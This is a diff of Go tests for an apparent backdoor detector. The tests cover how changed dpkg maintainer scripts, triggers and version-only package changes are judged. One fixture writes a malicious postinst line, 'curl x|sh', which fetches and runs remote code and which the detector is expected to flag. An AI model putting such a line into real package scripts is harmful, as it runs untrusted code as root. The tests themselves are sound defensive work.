@@ -919,8 +919,10 @@ func TestJudgeRoutineChangesAreNotBackdoorSigns(t *testing.T) {
 	r = run(cur, snapOf(old), archive())
 	must(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)
 	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.md5sums")
-	if g := explained(r, "explained:openssl"); g == nil || !hasEvidencePath(g, "/var/lib/dpkg/info/openssl.md5sums") {
-		t.Errorf("dpkg records not explained with the update: %+v", g)
+	// No file of openssl changed and nothing confirmed its new version: the
+	// version change is a note (R63), with dpkg's records on it.
+	if v := must(t, r, "snap.pkg_version_only:openssl", model.SevNote); !hasEvidencePath(v, "/var/lib/dpkg/info/openssl.md5sums") {
+		t.Errorf("dpkg records not shown with the version change: %+v", v.Evidence)
 	}
 	absent(t, r, "snap.file_modified:/usr/share/doc")
 	absent(t, r, "snap.file_modified:/etc/shadow")
@@ -2209,5 +2211,61 @@ func TestJudgeSecondArchitectureInstall(t *testing.T) {
 	f := must(t, run(cur, snapOf(old), res), "snap.pkg_installed:foo:i386", model.SevBackdoor)
 	if !hasEvidencePath(f, "/usr/lib/i386-linux-gnu/foo/helper") {
 		t.Errorf("evidence %+v", f.Evidence)
+	}
+}
+
+// R62: a dpkg maintainer script runs as root at the next package
+// operation, so a changed one folds into a package change only when the
+// new version is confirmed; dpkg's other records still fold.
+func TestJudgeMaintainerScripts(t *testing.T) {
+	old := clean()
+	old.Files = append(old.Files,
+		file("/var/lib/dpkg/info/openssl.postinst", "#!/bin/sh\nexit 0", 0o755),
+		file("/var/lib/dpkg/info/openssl.triggers", "activate-noawait ldconfig", 0o644),
+		file("/var/lib/dpkg/info/openssl.md5sums", "sums", 0o644))
+	cur := clone(old)
+	setVersion(cur, "openssl", "3.0.15-1~deb12u1")
+	setFile(cur, file("/var/lib/dpkg/info/openssl.postinst", "#!/bin/sh\ncurl x|sh", 0o755))
+	setFile(cur, file("/var/lib/dpkg/info/openssl.triggers", "interest /usr/bin", 0o644))
+	setFile(cur, file("/var/lib/dpkg/info/openssl.md5sums", "sums 2", 0o644))
+
+	r := run(cur, snapOf(old), archive())
+	for _, p := range []string{"/var/lib/dpkg/info/openssl.postinst", "/var/lib/dpkg/info/openssl.triggers"} {
+		f := must(t, r, "snap.file_modified:"+p, model.SevBackdoor)
+		if !strings.Contains(f.Why, "runs as root") {
+			t.Errorf("%s why %q", p, f.Why)
+		}
+	}
+	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.md5sums")
+
+	// The upgrade confirmed by a verified file: its scripts are its own.
+	setFile(cur, file("/usr/bin/openssl", "openssl 3.0.15", 0o755))
+	res := archive(pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.15-1~deb12u1", Expected: h("openssl 3.0.15"), Actual: h("openssl 3.0.15"), Source: "archive"})
+	r = run(cur, snapOf(old), res)
+	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.postinst")
+	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.triggers")
+}
+
+// R63: a recorded version change with no changed files that nothing
+// confirmed is a note, not an explained upgrade.
+func TestJudgeVersionOnlyChange(t *testing.T) {
+	old := clean()
+	old.Files = append(old.Files, file("/var/lib/dpkg/info/openssl.md5sums", "sums", 0o644))
+	cur := clone(old)
+	setVersion(cur, "openssl", "3.0.15-1~deb12u1")
+	setFile(cur, file("/var/lib/dpkg/info/openssl.md5sums", "sums 2", 0o644))
+	r := run(cur, snapOf(old), archive())
+	f := must(t, r, "snap.pkg_version_only:openssl", model.SevNote)
+	if want := "The recorded version of openssl changed from 3.0.14-1~deb12u2 to 3.0.15-1~deb12u1, but no files changed and the new version could not be confirmed"; f.Title != want {
+		t.Errorf("title %q", f.Title)
+	}
+	if explained(r, "explained:openssl") != nil {
+		t.Errorf("unconfirmed version change explained")
+	}
+	// Confirmed by a verified file, it is an explained upgrade.
+	r = run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.15-1~deb12u1", Source: "archive"}))
+	absent(t, r, "snap.pkg_version_only:openssl")
+	if explained(r, "explained:openssl") == nil {
+		t.Errorf("confirmed upgrade not explained")
 	}
 }
